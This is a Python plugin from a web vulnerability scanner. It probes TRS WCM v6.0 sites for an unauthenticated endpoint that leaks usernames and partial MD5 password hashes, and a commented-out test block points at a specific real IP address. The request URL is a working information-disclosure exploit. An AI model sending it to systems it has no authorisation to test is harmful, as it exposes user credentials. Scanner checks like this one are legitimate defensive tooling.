#!/usr/bin/python
# -*- coding: utf-8 -*-
from lib.common import *

def run_domain(http,ob):
    try:
        list = []
        domain = ob['domain']
        base_path = ob['base_path']
    
        url = "%s://%s%s%s" % (ob['scheme'],domain,"/","wcm/infoview.do?serviceid=wcm6_user&MethodName=getUsersByNames&UserNames=admin")
#        logging.getLogger().error( url)
        #res, content = http.request(url)
        res, content = yx_httplib2_request(http,url)
#        logging.getLogger().error( content)
        if res and res.has_key('status') and res['status'] == '200' and content and content != '':
            if content.find("<USERNAME><![CDATA[")>=0:
                detail = "TRS某些版本存在高风险安全漏洞，访问  URL ：%s 存在严重的安全风险，泄露了用户的隐私信息，可能导致系统被攻击！（密码为MD5前15位）\n" % (url)
                request = getRequest(url)
                response = getResponse(res)
                
                list.append(getRecord(ob,url,ob['level'],detail,request,response))
                
            #end if
        #end if
    except Exception,e:
        logging.getLogger().error("File:TRS_WCM_V6.0GetusersScript.py, run_domain function :" + str(e) + ",task id:" + ob['task_id'] + ",domain id:" + ob['domain_id'])
        write_scan_log(ob['task_id'],ob['domain_id'],"File:TRS_WCM_V6.0GetusersScript.py, run_domain function :" + str(e))
    #end try
    return list
#end def

'''
if __name__ == '__main__':
    http = httplib2.Http(timeout=5)
    ob = {'domain':'61.178.48.24:8080','base_path':'/','task_id':'1','domain_id':'1'}
    run_domain(http,ob)
#end if
'''




